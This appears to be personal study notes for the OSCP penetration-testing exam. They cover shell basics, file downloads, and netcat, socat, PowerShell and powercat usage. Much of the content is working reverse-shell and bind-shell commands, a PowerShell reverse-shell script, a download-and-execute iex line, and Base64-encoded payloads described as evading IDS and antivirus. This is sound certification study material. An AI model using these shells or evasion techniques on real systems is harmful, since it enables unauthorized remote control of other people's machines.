# OSCP Notes

> 106_Sam

## Table of Content
 1. [Managing Process](#managing-process)
 2. [Downlaoding Files](#downloading-files)
 3. [Customizing the Bash Environment](#customizing-the-bash-environment)
 4. [Practical Tools](#practical-tools)
    - [NetCat](#netcat)
    - [NetCat Bind Shell](#netcat-bind-shell)
    - [NetCat Reverse Shell](#netcat-reverse-shell)
 5. [Socat](#socat)
 6. [Netcat vs Socat](#netcat-vs-socat)


## Managing process

_To suspend the job_ - `ctrl + z`  
_To cancel the job_ - `ctrl + c`  
_To list background process_ 
```
bg
```
_To list jobs that are running in the current terminal session_
```
jobs
```
_To return a job to the foreground_
```
fg
fg %1 or %2..n
```
_To run a designated command or script at regular intervals_
```
watch -n 2 <path/of/command/or/script>
```
---
## Downloading files
Linux
```bash
wget -O <file_name> <full_url_path>
curl -o <file_name> <full_url_path>
axel -a -n <num:eg:20> -o <file_name> <full_url_path> (-n specify the number of connection)
```
Windows
```powershell
powershell -command wget -o <file_name> <full_url_path>
powershell -command curl -o <file_name> <full_url_path>
powershell -command Invoke-WebRequest <url> -O <file.jpg>
iex (New-Object System.Net.Webclient).DownloadString('<URL>')
```
---

## Customizing the Bash Environment
_Bash history customization_
```bash
export HISTCONTROL=ignoredups
export HISTIGNORE="&:ls:[bf]g:exit:history"
history
export HISTTIMEFORMAT='%F %T '
```
- HISTCONTROL - _to remove duplicates from our bash history_
- HISTIGNORE - _a variable is particularly useful for filtering out basic commands that frequently, such as ls,exit,history.bg,etc._
-  HISTTIMEFORMAT - _to include the data/time in our bash history_
___
_Alias_

Aliases are useful for replacing commonly used commands and switches with a shorter command or alias, that we define.
```bash
alias cls='clear'
alias mdkir='ping -c 1 localhost'
```
***note: the alias command doesn't have any restrictions on the words used for an alias,therefore it is possible to create an alias using a word that already corresponds to an existing command.***

_unalias_
```bash
unalias mkdir
```
solution for alias if we overwrite existing command use unalias or exit the current session 

---
_Persistent Bash Customization_
 
***/etc/bash.bashrc*** - behavior of interactive shells in bash is defined in this file.

***~/.bashrc*** - behavior of specific users shell.

- make changes this file like adding alias to this will make it 
persistent alias.
- HISTSIZE and HISTFILESIZE environment variables values can be changed.

---
# Practical Tools
## Netcat
- First released in 1995 by ***HOBIT*** 
- Also known as "Swiss Army Knife".
- *Hobbit* himself: a simple utility which reads and writes data across network connections, using TCP or UDP protocols.

_1. Connecting to a TCP/UDP Port_  

- Client mode :
```bash
nc -nv <ip-address> <port>
```

_2. Listening on a TCP/UDP Port_

- Listening mode(chat)
```powershell
nc -nlvp <port>
```

- Connection mode:(chat)
 ```bash
 nc -nv <ip> <port>
 ```
 
_3. Tranferring FIles with NetCat_

note : dd(a disk copying utility(Forensics investigators))
 
Linux &rarr; Windows
 - on Windows
 ```cmd
 nc -nlvp 4444 > incoming.exe
 ```
 - on Linux
 ```bash
 nc -nv <ip> <port> < /usr/share/windows-resources/binaries/wget.exe
 ```
 
Windows &rarr; Linux

 - on Linux 
 ```bash
 nc -nvlp 4444 > incoming.txt
 ```
 
 - on Windows 
 ```cmd
 nc -nv <ip> <port> < outgoing.txt
```

_4. Remote Administration with Netcat_

## NetCat Bind Shell 

_DGaping security hole_

- client(Bon)
```bash
nc -nlvp 4444 -e cmd.exe
```
- Helper(Alice)
```bash
nc -nv 10.11.0.22 4444
```
![Bind Shell](https://i.imgur.com/uryYaJa.png)

---
## NetCat Reverse Shell 

- client(Alice)
```bash
nc -nlvp 4444
```
- helper(Bob)
```bash
nc -nv 10.11.0.22 4444 -e /bin/bash
```
![Reverse Shell](https://i.imgur.com/jeTs3lq.png)
---
# Socat
- It is a command-line utlity that establishes tow bidirectional byte streams and transfers data between them. For Penetration testing.
- It is similar to Netcat but has additional useful features.

## Netcat vs Socat
- connection mode:(chat)
```bash
nc <remote server's ip address> 80 
socat - TCP4:<remote sever's ip address>:80
```
_note: we require root privilege to bind listener to ports below 1024_
- listening mode:(chat)
```bash
sudo nc -lvp localhost 443
sudo socat TCP4-LISTEN:443 STDOUT
```
## Socat File Transfers
Alice need to send Bob 
- Linux &rarr; Windows
 - On Linux 
     ```bash
     sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
 ```
 - On Windows
     - ```bash
     socat TCP4:10.11.0.4.:443 file:received_secret_passwords.txt,create
     ```
---
## Socat Reverse Shells
- On window
```bash
    socat -d TCP4-LISTEN:443 STDOUT
```
- On Linux
```bash
    socat TCP4:127.0.0.1:443 EXEC:/bin/bash
```
## Socat Encrypt Bind Shells
_Note:- Secure Socket Layer certificates. 
This level of encryption will assist in evading intrusion detection system(IDS) and will help hide the sensitive data we are transceiving._
![](https://i.imgur.com/rJRoHmo.png)
![](https://i.imgur.com/tYfIwOT.png)
- Creating self-signed certificate

```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt

cat bind_shell.key bind_shell.crt > bind_shell.pem
```

- Listening using SSL
```bash
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem, verify=0,fork EXEC:/bin/bash
```

_note:- We will use *-* to transfer data between STDIO and  *OPENSSL* to establish a remote SSL connection to Alice's listener, *verify=0* to disable SSL certificate verification_

# Powershell and Powercat
Windows PowerShell is a task-based command line shell and scripting language. It is designed specifically for system administrators and power-users to rapidly automate the administration of multiple operating systems and the processes related to the applications that run on them.
- Windows Powershell 5.0 - windows server 2008,2012 R2 and windows 7.

- Windows Powershell 4.0 - Win 8.1/Win Server 2012 R2, Win 7 2008
- Windows Powershell 3.0 - Win 8;Win Server 2012, win 7,2008

removing unrestricted powershell
```powershell
    Set-ExecutionPolicy Unrestricted

```
press y;
```powershell
    Get-ExecutionPolicy 
```
## PowerShell FIle Transfers

```powershell
    powershell -c "(new-object System.Net.Webclient).DownloadFile('http://<ip>/<file_name>','<destination>')"
    
    wget.exe -V
```
| option | Description |
|--- |--- |
| -c | execute the supplied command |
|new-object|cmdlet, which allows us to instantiate either a .Net Framework or a COM object|
|WebClient class | used to access resources identified by a URI|
|DownloadFile public method| Requires two key parameters a source location(URI),, and a target location where the retrieved data will be stored|

## PowerShell Reverse Shells
- PowerShell one-liners

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);
$stream = $client.GetStream();
[bytes[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding])::ASCII.GetBytes($sendback2);
    $stream.Write($sendbytes, 0, $sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

|option|functionality|
|---|---|
|client variable| we assign target IP address|
|stream variable| for getting stream |
|Byte array| bytes|
|While loop| several lines responsible for reading and writing data to the network stream|

_note: iex = Invoke-Expression cmdlet is a key part of this code chunk as it runs any string it receives as a command_

## PowerShell Bind Shells
_The process is reversed when dealing with bind shells. We first create the bind shell through PowerShell on Bob's Computer, and then use Netcat to connect to it from Alice's_

```powershell
 powershell -c "$listener = New-Object System.Net.Sockets.TCPListener('0.0.0.0',<port>);$listener.start();$client=$listener.AcceptTcpClient();$stream=$client.GetStream();[byte[]]$bytes = 0..65532|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```
 
 _We include the `-v` option for Netcat as our bind shell may not always present us with a command prompt when it first connects_
```bash
 nc -nv <ip> <port>
```

# Powercat
Powercat is essentially the Powershell version of Netcat wrriten by `besimorhino`. It is a script we can download to a Windows host to leverage the strengths of PowerShell and simplifies the creation of bind/reverse shells 

```bash
 apt install powercat
```
_Which will place the script in /usr/share/windows-resources/powercat_

With the script on the target host, we start by using a PowerShell feature known as `Dot-Sourcing` to load the powercat.ps1 script. This will make all the variable and functions declared in the script available in the current PowerShell scope. So, we can use the powercat function directly.

```powershell
 . .\powercat.ps1
```
After script loaded:
```powershell
 powercat -h
```
## Powercat File Transfers
- Windows &rarr; Linux
  - Linux_listener
 ```bash
  sudo nc -lnvp <port> > receiving_powercat.ps1
 ```
  - Windows_connection
  ```powershell
   powercat -c <ip> -p <port> -i <file_path>
  ```
## Powercat Reverse Shells
```bash 

 sudo nc -lvp <port>
```

```powershell
 powercat -c <ip> -p <port> -e cmd.exe
```

## Powercat Bind Shells
```powershell
 powercat -l -p <port> -e cmd.exe
```

```bash
 nc <ip> <port>
```

## Powercat Stand-Alone Payloads
- Powercat can also generate stand-alone payloads In the context of powercat, a payload is a set of powershell instructions as well as the portion of the powercat script itself that only includes the features requested by the user.
- it has poor success rate and will likely be caught by defensive software solutions.

```powershell
 powercat -c <ip> -p <port> -e cmd.exe -g > revershell.ps1
 
 ./revershell.ps1
```
- we can attempt to overcome this problem by making use of PowerShell's ability to execute `Base64` encoded command. To generate a stand-alone encoded commands. `-ge` option for encoding and generating.

```powershell
 powercat -c <ip> -p <port> -e cmd.exe -ge > encodedreverseshell.ps1
```
- `-E` - the file will contain an encoded string that can be executed using the Powershell (EncodedCommand) option.

```powershell
 powershell.exe -E "<encode_string of reverse shell>"
```
# Wireshark Basics
